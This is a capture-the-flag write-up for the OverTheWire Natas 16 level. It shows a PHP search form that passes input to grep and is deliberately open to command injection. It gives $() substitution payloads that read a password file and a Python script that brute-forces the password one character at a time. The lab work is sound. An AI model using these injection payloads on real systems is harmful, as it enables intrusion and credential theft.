# Natas 16 -> 17

```
http://natas16.natas.labs.overthewire.org
```

```
Username: natas16
```

Similar to a `natas9`, we have a form to look for words.

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```

This time we can't pass certain chars. And what's interesting in the set of characters they don't allow is the backtick.  
In other words, they don't want us to pass commands to `$key`, but there's another way to write commands `$()`.  
Since neither of `$()` appear in the `preg_match` regexp, we know that we can use that but we need to execute a command that would return something, otherwise the output would return empty.

```
?needle=$(echo A)
```

```
African
Africans
Allah
Allah's
American
...
```

Good :-)  
Now we need to think a way to obtain the content of `/etc/natas_webpass/natas17`:  
`cat` won't work because it'll return the content and the `grep` command will end up like `grep -i "{password}" dictionary.txt` and won't return any result... so, what about `grep` inside `grep` *insert xzibit joke here*.

```
?needle=$(grep a /etc/natas_webpass/natas17)
```

```
African
Africans
Allah
Allah's
American
...
```

Great, it works too. But to be more precise, we should look for the *first* character in the password file, so:

```
?needle=$(grep ^a.* /etc/natas_webpass/natas17)
```

No result. That's good! That means nothing matched in the password file so the `grep` command ended up like `grep "" dictionary.txt`. Well, seems like we need to *bruteforce* our way into `natas17` again.  
So our regexp to use in the `grep` inside `grep` has to look something like this:  

```
^{char}.*
```

`^` means *match lines starting with...* and `.*` matches all.
Since matching something will return something random from `dictionary.txt`, let's append an unique word from this dict file, like `zigzagging`.  

```
$(grep ^{char}.* /etc/natas_webpass/natas17)zigzagging
```

If prints `zigzagging` it means `grep` didn't match anything, if doesn't print anything, means it matched something.


Let's reuse the same script of the previous level.

```python
#!/usr/bin/env python

import sys
import string
import requests

url = "http://natas16.natas.labs.overthewire.org/"
http_user = "natas16"
http_pass = ""

bf_passwd = ""
bf_dict = string.ascii_letters + string.digits

while len(bf_passwd) != 32:
    for char in bf_dict:
        r = requests.get(url,
                         params={
                             'needle': '$(grep ^{}.* /etc/natas_webpass/natas17)zigzagging'.format(bf_passwd + char)
                         },
                         auth=(http_user, http_pass))
        sys.stdout.write("\rTrying: {} | Password: {}".format(char, bf_passwd))
        sys.stdout.flush()
        if "zigzagging" not in r.text:
             bf_passwd += char
             sys.stdout.write("\rMatch: {} | Password: {}".format(char, bf_passwd))
             sys.stdout.flush()
             break

print "\rPassword: {}".format(bf_passwd)
```


* php
* python
* preg_match
* grep
